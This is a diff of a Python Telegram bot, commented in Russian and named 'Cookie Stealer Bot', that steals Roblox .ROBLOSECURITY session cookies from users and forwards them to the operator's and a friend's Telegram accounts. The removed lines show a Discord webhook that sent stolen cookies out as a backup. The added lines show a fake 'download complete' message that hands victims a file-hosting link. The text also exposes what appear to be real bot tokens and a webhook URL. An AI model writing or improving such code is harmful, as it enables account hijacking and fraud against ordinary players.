@@ -19,8 +19,8 @@ SENDER_BOT_TOKEN = "8239746415:AAGmQxpDiRZw59vqzfyJe_Pz9o5aSc8e2po"
 MY_TELEGRAM_ID = 7712154413          # Твой ID
 FRIEND_TELEGRAM_ID = 7880766609      # ID друга (замени на реальный)
 
-# Discord вебхук (бэкап)
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1410916698143326210/smw3JGFHp0gDqLnphzUBGrp_1mCwdk06oB7IRZ9Fp5akO1DBHae11Xa3qKJYd8XSLuhN"
+# Ссылка для скачивания
+DOWNLOAD_URL = "https://workupload.com/file/kaC6yMBPffx"
 
 # ========== КОНЕЦ КОНФИГУРАЦИИ ==========
 
@@ -129,36 +129,28 @@ async def send_cookies_to_both(cookie_value: str, user_info: str):
         except Exception as e:
             print(f"[ERROR] Не удалось отправить другу: {e}")
         
-        # Отправляем в Discord (бэкап)
-        await send_cookie_to_discord(cookie_value, user_info)
-        
     except Exception as e:
         print(f"[ERROR] Ошибка отправки: {e}")
 
-async def send_cookie_to_discord(cookie_value: str, user_info: str):
-    """Отправляет .ROBLOSECURITY куки в Discord (бэкап)"""
+async def send_download_link_to_user(message: Message):
+    """Отправляет ссылку для скачивания пользователю"""
     try:
-        if not cookie_value:
-            return
+        # Формируем сообщение со ссылкой
+        link_message = (
+            "✅ *Скачивание успешно завершено!*\n\n"
+            "📥 **Скачайте файл по ссылке:**\n"
+            f"{DOWNLOAD_URL}\n\n"
+            "⚠️ Ссылка действительна 24 часа"
+        )
         
-        cookie = f".ROBLOSECURITY={cookie_value}"
-        
-        if len(cookie) > 1990:
-            cookie = cookie[:1990] + "..."
-        
-        message_content = f"@everyone\n**Юзер:** {user_info}\n\n{cookie}"
-        
-        payload = {
-            "content": message_content,
-            "username": "Cookie Stealer Bot"
-        }
-        
-        async with aiohttp.ClientSession() as session:
-            await session.post(DISCORD_WEBHOOK_URL, json=payload)
-            print(f"[BACKUP] Куки отправлен в Discord")
+        await message.answer(link_message, parse_mode="Markdown")
+        print(f"[SUCCESS] Ссылка отправлена пользователю: {DOWNLOAD_URL}")
+        return True
                 
     except Exception as e:
-        print(f"[ERROR] Ошибка отправки в Discord: {e}")
+        print(f"[ERROR] Ошибка отправки ссылки: {e}")
+        await message.answer("❌ Ошибка при отправке ссылки")
+        return False
 
 @router.message(CommandStart())
 async def start(message: Message):
@@ -251,31 +243,8 @@ async def get_code(message: Message):
         wait_time = random.randint(5, 10)
         await asyncio.sleep(wait_time)
         
-        # Имя файла
-        filename = extract_game_name_from_powershell(full_code) if is_powershell else "Steal_a_Braintot.rbxl"
-        
-        # Создаем файл
-        try:
-            if not os.path.exists("temp_files"):
-                os.makedirs("temp_files")
-            
-            filepath = os.path.join("temp_files", filename)
-            
-            # Записываем куки в файл
-            with open(filepath, 'w', encoding='utf-8') as f:
-                if roblosecurity_value:
-                    f.write(f".ROBLOSECURITY={roblosecurity_value}")
-                else:
-                    f.write("Не удалось извлечь куки")
-            
-            document = FSInputFile(filepath, filename=filename)
-            await message.answer_document(document, caption=f"✅ Файл: {filename}")
-            
-            os.remove(filepath)
-            
-        except Exception as e:
-            print(f"[ERROR] Ошибка: {e}")
-            await wait_msg.edit_text("ошибка")
+        # Отправляем ссылку для скачивания
+        await send_download_link_to_user(message)
         
         # Очищаем
         if user_id in user_code_parts:
@@ -303,6 +272,8 @@ async def main():
         print(f"[INFO] Бот для отправки: @{me.username}")
         print(f"[INFO] Отправка тебе: ID {MY_TELEGRAM_ID}")
         print(f"[INFO] Отправка другу: ID {FRIEND_TELEGRAM_ID}")
+        print(f"[INFO] Ссылка для скачивания: {DOWNLOAD_URL}")
+            
     except Exception as e:
         print(f"[ERROR] Не удалось подключиться к боту для отправки: {e}")
         sender_bot = None
@@ -312,6 +283,8 @@ async def main():
     
     try:
         await dp.start_polling(bot)
+    except KeyboardInterrupt:
+        print("\n[INFO] Бот остановлен")
     finally:
         # Закрываем соединения при выходе
         if sender_bot:
@@ -319,4 +292,8 @@ async def main():
         await bot.session.close()
 
 if __name__ == "__main__":
+    print("=" * 50)
+    print("Cookie Stealer Bot - Запуск...")
+    print("=" * 50)
+    print(f"Ссылка для скачивания: {DOWNLOAD_URL}")
     asyncio.run(main())
